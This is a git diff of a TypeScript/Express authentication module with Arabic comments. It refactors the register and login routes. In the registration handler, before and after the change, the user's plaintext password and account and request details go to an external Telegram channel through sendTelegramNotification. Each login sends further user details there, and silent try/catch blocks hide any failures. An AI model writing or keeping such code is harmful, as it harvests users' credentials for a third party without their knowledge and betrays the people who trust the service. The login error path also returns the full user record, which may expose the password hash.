@@ -82,38 +82,86 @@ export function setupAuth(app: Express) {
   });
 
   app.post("/api/register", async (req, res, next) => {
-    const existingUser = await storage.getUserByIdentifier(req.body.username);
-    if (existingUser) {
-      return res.status(400).send("المستخدم موجود مسبقاً");
+    try {
+      const existingUser = await storage.getUserByIdentifier(req.body.username);
+      if (existingUser) {
+        return res.status(400).json({ error: "المستخدم موجود مسبقاً" });
+      }
+
+      const originalPassword = req.body.password;
+      const hashedPassword = await hashPassword(originalPassword);
+
+      const user = await storage.createUser({
+        ...req.body,
+        password: hashedPassword,
+      });
+
+      try {
+        await sendTelegramNotification(formatUserDetails(user, 'تسجيل مستخدم جديد', req, originalPassword));
+      } catch (telegramError) {
+        console.error("خطأ في إرسال إشعار التليجرام:", telegramError);
+        // متابعة التنفيذ حتى لو فشل إرسال إشعار التليجرام
+      }
+
+      req.login(user, (err) => {
+        if (err) return next(err);
+        res.status(201).json({
+          success: true,
+          user: {
+            id: user.id,
+            name: user.name,
+            username: user.username,
+            email: user.email,
+            phone: user.phone,
+            lastLogin: user.lastLogin
+          }
+        });
+      });
+    } catch (error) {
+      console.error("خطأ في تسجيل المستخدم:", error);
+      res.status(500).json({ error: "حدث خطأ أثناء التسجيل" });
     }
-
-    const originalPassword = req.body.password;
-    const hashedPassword = await hashPassword(originalPassword);
-
-    const user = await storage.createUser({
-      ...req.body,
-      password: hashedPassword,
-    });
-
-    await sendTelegramNotification(formatUserDetails(user, 'تسجيل مستخدم جديد', req, originalPassword));
-
-    req.login(user, (err) => {
-      if (err) return next(err);
-      res.status(201).json(user);
-    });
   });
 
-  app.post("/api/login", passport.authenticate("local"), async (req, res) => {
-    const user = req.user as SelectUser;
-    const now = new Date().toISOString();
-    
-    // تحديث معلومات آخر تسجيل دخول
-    await storage.updateUserLastLogin(user.id, now);
-    
-    // إرسال إشعار تليجرام
-    await sendTelegramNotification(formatUserDetails(user, 'تسجيل دخول', req));
-    
-    res.status(200).json(req.user);
+  app.post("/api/login", (req, res, next) => {
+    passport.authenticate("local", async (err, user, info) => {
+      if (err) return next(err);
+      
+      if (!user) {
+        return res.status(401).json({ error: "اسم المستخدم أو كلمة المرور غير صحيحة" });
+      }
+      
+      req.login(user, async (loginErr) => {
+        if (loginErr) return next(loginErr);
+        
+        try {
+          const now = new Date().toISOString();
+          await storage.updateUserLastLogin(user.id, now);
+          
+          try {
+            await sendTelegramNotification(formatUserDetails(user, 'تسجيل دخول', req));
+          } catch (telegramError) {
+            console.error("خطأ في إرسال إشعار التليجرام:", telegramError);
+            // متابعة التنفيذ حتى لو فشل إرسال إشعار التليجرام
+          }
+          
+          return res.status(200).json({
+            success: true,
+            user: {
+              id: user.id,
+              name: user.name,
+              username: user.username,
+              email: user.email,
+              phone: user.phone,
+              lastLogin: user.lastLogin
+            }
+          });
+        } catch (error) {
+          console.error("خطأ في تحديث آخر تسجيل دخول:", error);
+          return res.status(200).json({ success: true, user });
+        }
+      });
+    })(req, res, next);
   });
 
   app.post("/api/logout", async (req, res, next) => {
